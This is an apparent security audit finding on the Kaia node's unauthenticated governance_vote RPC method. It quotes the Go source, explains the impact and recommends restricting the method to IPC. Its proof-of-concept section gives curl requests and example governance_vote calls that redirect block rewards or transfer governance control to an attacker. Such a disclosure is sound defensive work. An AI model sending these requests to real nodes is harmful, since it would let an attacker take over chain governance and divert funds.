### Title
Unauthenticated `governance_vote` RPC Endpoint Allows Any Caller to Queue Governance Parameter Changes on Behalf of the Governing Node — (`File: kaiax/gov/headergov/impl/api.go`)

---

### Summary

The `governance_vote` JSON-RPC method (`headerGovAPI.Vote`) is registered with `Public: true` and contains no check on the identity of the RPC caller. The voter identity is always taken from the node's own address (`api.h.nodeAddress`), not from the caller. Any external party who can reach the node's HTTP or WebSocket RPC endpoint can call `governance_vote` and queue a governance parameter change that will be written into the next block the node proposes as `header.Vote`, causing it to be ratified at the next epoch boundary.

---

### Finding Description

`headerGovAPI.Vote` in `kaiax/gov/headergov/impl/api.go` is the handler for the `governance_vote` RPC method:

```go
func (api *headerGovAPI) Vote(name string, value any) (string, error) {
    var (
        voter     = api.h.nodeAddress          // always the node's own address
        nextBlock = api.h.Chain.CurrentBlock().NumberU64() + 1
        gp        = api.h.GetParamSet(nextBlock)
        gMode     = gp.GovernanceMode
    )

    if gMode == "single" && voter != gp.GoverningNode {
        return "", ErrVotePermissionDenied
    }
    // ... format/consistency checks ...
    api.h.PushMyVotes(vote)   // queues the vote for the next block this node proposes
    return "...", nil
}
``` [1](#0-0) 

The only guard (`gMode == "single" && voter != gp.GoverningNode`) checks whether the **node's own address** is the governing node — it does not check whether the **RPC caller** is authorized to trigger a vote. There is no `msg.sender`-equivalent check, no API key, and no IP restriction at the RPC layer.

The API is registered as `Public: true`:

```go
func (h *headerGovModule) APIs() []rpc.API {
    return []rpc.API{
        {
            Namespace: "governance",
            Version:   "1.0",
            Service:   NewHeaderGovAPI(h),
            Public:    true,
        },
    }
}
``` [2](#0-1) 

The HTTP endpoint registration logic exposes all `Public: true` APIs when the module whitelist is empty, and exposes whitelisted namespaces otherwise:

```go
if !api.IPCOnly && (whitelist[api.Namespace] || (len(whitelist) == 0 && api.Public)) {
    if err := handler.RegisterName(api.Namespace, api.Service); err != nil { ...
``` [3](#0-2) 

Once queued via `PushMyVotes`, the vote is written into `header.Vote` by `PrepareHeader` the next time the node proposes a block:

```go
func (h *headerGovModule) PrepareHeader(header *types.Header) error {
    if vote, ok := h.peekMyVote(); ok {
        voteBytes, err := vote.ToVoteBytes()
        ...
        header.Vote = voteBytes
    }
``` [4](#0-3) 

`VerifyVote` on other nodes will accept the vote because the voter field in the serialized `VoteData` is the node's own address (a legitimate council member / governing node), not the attacker's address:

```go
if !slices.Contains(council, vote.Voter()) {
    return ErrInvalidKeyValue
}
if author != vote.Voter() {
    return ErrInvalidVoter
}
``` [5](#0-4) 

---

### Impact Explanation

An attacker who can reach the governing node's RPC endpoint can call:

```
governance_vote("reward.mintingamount", <attacker-chosen value>)
governance_vote("governance.governingnode", <attacker address>)
governance_vote("reward.ratio", "100/0/0")
governance_vote("governance.unitprice", 0)
```

The queued vote is written into the next block the governing node proposes. At the next epoch boundary, the ratification is written into `header.Governance` and takes effect for all subsequent blocks. This allows:

- **Unauthorized change of `reward.mintingamount`**: inflating or deflating KAIA minting per block, directly affecting all reward distributions computed in `FinalizeState` → `state.AddBalance`.
- **Unauthorized transfer of governance control** via `governance.governingnode`: the attacker's address becomes the sole entity allowed to vote in "single" mode.
- **Unauthorized change of `reward.ratio`**: redirecting validator/fund reward splits, affecting KAIA balances of KIF, KEF, KPF, and proposer addresses.
- **Unauthorized change of `governance.unitprice`**: setting gas price to 0 or an extreme value, breaking fee accounting.

All of these are protected-state impacts (KAIA reward distribution, governance authority) reachable without any privileged key.

---

### Likelihood Explanation

- The governing node's RPC endpoint is commonly exposed on CNs for operational management (governance voting is an operator action).
- The `governance` namespace is `Public: true` and is included whenever the HTTP module whitelist is empty or explicitly includes `governance`.
- No authentication is required at the RPC layer; a single HTTP POST suffices.
- The attack is silent: the vote appears legitimate on-chain because it carries the governing node's address.
- In `none` governance mode, the same attack applies to any council member node with an exposed RPC.

---

### Recommendation

Add a caller-identity check inside `Vote`. Since the RPC server does not expose `msg.sender`, the standard mitigation is to mark the API `IPCOnly: true` (restricting it to the local Unix socket) or add an explicit `Public: false` flag so it is never served over HTTP/WebSocket:

```go
func (h *headerGovModule) APIs() []rpc.API {
    return []rpc.API{
        {
            Namespace: "governance",
            Version:   "1.0",
            Service:   NewHeaderGovAPI(h),
            Public:    true,
            IPCOnly:   true,   // restrict governance_vote to local IPC only
        },
    }
}
``` [2](#0-1) 

Alternatively, split the API registration so that read-only methods (`IdxCache`, `Votes`, `MyVotes`, `Status`) remain `Public: true` while the state-mutating `Vote` method is in a separate service registered as `IPCOnly: true`. This mirrors how `debug` and `admin` namespaces are handled elsewhere in the codebase. [6](#0-5) 

---

### Proof of Concept

Precondition: the governing node's HTTP RPC is reachable (e.g., `http://cn-node:8551`) and the `governance` namespace is enabled.

```bash
# Step 1: Confirm the node is the governing node
curl http://cn-node:8551 -X POST -H 'Content-Type: application/json' \
  --data '{"jsonrpc":"2.0","id":1,"method":"governance_nodeAddress","params":[]}'
# Returns the node's address, e.g. 0xGoverningNode

# Step 2: Queue a vote to redirect all minting to the proposer (ratio 100/0/0)
curl http://cn-node:8551 -X POST -H 'Content-Type: application/json' \
  --data '{"jsonrpc":"2.0","id":2,"method":"governance_vote",
           "params":["reward.ratio","100/0/0"]}'
# Returns: "Your vote is prepared..."

# Step 3: Wait for the node to propose a block — header.Vote is now set
# Step 4: At the next epoch boundary, header.Governance ratifies the change
# Step 5: From (epoch+1)*epoch onward, reward.ratio == "100/0/0" for all blocks
#         FinalizeState distributes 100% of minting to the proposer, 0% to KIF/KEF
```

The vote passes `VerifyVote` on all peers because `vote.Voter()` equals the governing node's address (a legitimate council member), and `author == vote.Voter()` since the governing node proposed the block. [1](#0-0) [4](#0-3) [7](#0-6)

### Citations

**File:** kaiax/gov/headergov/impl/api.go (L13-22)
```go
func (h *headerGovModule) APIs() []rpc.API {
	return []rpc.API{
		{
			Namespace: "governance",
			Version:   "1.0",
			Service:   NewHeaderGovAPI(h),
			Public:    true,
		},
	}
}
```

**File:** kaiax/gov/headergov/impl/api.go (L53-83)
```go
func (api *headerGovAPI) Vote(name string, value any) (string, error) {
	var (
		voter     = api.h.nodeAddress
		nextBlock = api.h.Chain.CurrentBlock().NumberU64() + 1
		gp        = api.h.GetParamSet(nextBlock)
		gMode     = gp.GovernanceMode
	)

	if gMode == "single" && voter != gp.GoverningNode {
		return "", ErrVotePermissionDenied
	}

	vote := headergov.NewVoteData(voter, name, value)
	if vote == nil {
		return "", ErrInvalidKeyValue
	}

	if gov.DeprecatedAt(vote.Name(), api.h.ChainConfig.Rules(new(big.Int).SetUint64(nextBlock))) {
		return "", ErrDeprecatedVote
	}

	err := api.h.checkConsistency(nextBlock, vote)
	if err != nil {
		return "", err
	}

	// TODO-kaiax: add removevalidator vote check

	api.h.PushMyVotes(vote)
	return "(kaiax) Your vote is prepared. It will be put into the block header or applied when your node generates a block as a proposer. Note that your vote may be duplicate.", nil
}
```

**File:** networks/rpc/endpoints.go (L47-52)
```go
		if !api.IPCOnly && (whitelist[api.Namespace] || (len(whitelist) == 0 && api.Public)) {
			if err := handler.RegisterName(api.Namespace, api.Service); err != nil {
				return nil, nil, err
			}
			logger.Debug("HTTP registered", "namespace", api.Namespace)
		}
```

**File:** kaiax/gov/headergov/impl/header.go (L30-55)
```go
func (h *headerGovModule) PrepareHeader(header *types.Header) error {
	// if this node has a vote waiting to be casted, put Vote field.
	if vote, ok := h.peekMyVote(); ok {
		voteBytes, err := vote.ToVoteBytes()
		if err != nil {
			return err
		}
		header.Vote = voteBytes
		logger.Debug("Prepare header with vote", "num", header.Number.Uint64(), "vote", hexutil.Encode(header.Vote))
	}

	// if epoch block & vote exists in the last epoch, put Governance field.
	if header.Number.Uint64()%h.epoch == 0 {
		gov := h.getExpectedGovernance(header.Number.Uint64())
		if len(gov.Items()) > 0 {
			govBytes, err := gov.ToGovBytes()
			if err != nil {
				return err
			}
			header.Governance = govBytes
			logger.Debug("Prepare header with governance", "num", header.Number.Uint64(), "governance", hexutil.Encode(header.Governance))
		}
	}

	return nil
}
```

**File:** kaiax/gov/headergov/impl/header.go (L87-99)
```go
	// check if the voter is in council
	if !slices.Contains(council, vote.Voter()) {
		return ErrInvalidKeyValue
	}

	// check if Voter is the block proposer.
	author, err := h.Chain.Sealer().Author(header)
	if err != nil {
		return err
	}
	if author != vote.Voter() {
		return ErrInvalidVoter
	}
```

**File:** node/cn/backend.go (L789-812)
```go
			Namespace: "admin",
			Version:   "1.0",
			Service:   kaiaDownloaderSyncAPI,
		}, {
			Namespace: "admin",
			Version:   "1.0",
			Service:   NewAdminChainCNAPI(s),
		}, {
			Namespace: "debug",
			Version:   "1.0",
			Service:   NewDebugCNAPI(s),
			Public:    false,
		}, {
			Namespace: "debug",
			Version:   "1.0",
			Service:   tracers.NewAPI(s.APIBackend),
			Public:    false,
		}, {
			Namespace: "debug",
			Version:   "1.0",
			Service:   tracers.NewUnsafeAPI(s.APIBackend),
			Public:    false,
			IPCOnly:   s.config.DisableUnsafeDebug,
		}, {
```

**File:** kaiax/reward/impl/blockstate.go (L30-57)
```go
func (r *RewardModule) FinalizeState(header *types.Header, state *state.StateDB, txs []*types.Transaction, receipts []*types.Receipt) error {
	if r.GovModule.GetParamSet(header.Number.Uint64()).ProposerPolicy == uint64(istanbul.WeightedRandom) && common.EmptyHash(header.Root) {
		qualified, err := r.ValsetModule.GetQualifiedValidators(header.Number.Uint64())
		if err != nil {
			return err
		}
		useRewardAddress := valset.NewAddressSet(qualified).Contains(r.NodeAddress)

		if rewardAddr := r.GetRewardAddress(header.Number.Uint64(), r.NodeAddress); useRewardAddress && rewardAddr != (common.Address{}) {
			header.Rewardbase = rewardAddr
			logger.Trace("Use reward address for nodeValidator", "header.Number", header.Number.Uint64(), "nodeAddress", r.NodeAddress, "rewardbase", header.Rewardbase)
		} else {
			logger.Trace("No reward address for nodeValidator. Use node's rewardbase.", "header.Number", header.Number.Uint64(), "nodeAddress", r.NodeAddress, "rewardbase", header.Rewardbase)
		}
	}

	spec, err := r.GetDeferredReward(header, txs, receipts)
	if err != nil {
		return err
	}
	if err := spec.Validate(); err != nil {
		return err
	}
	for addr, amount := range spec.Rewards {
		state.AddBalance(addr, amount)
	}
	return nil
}
```
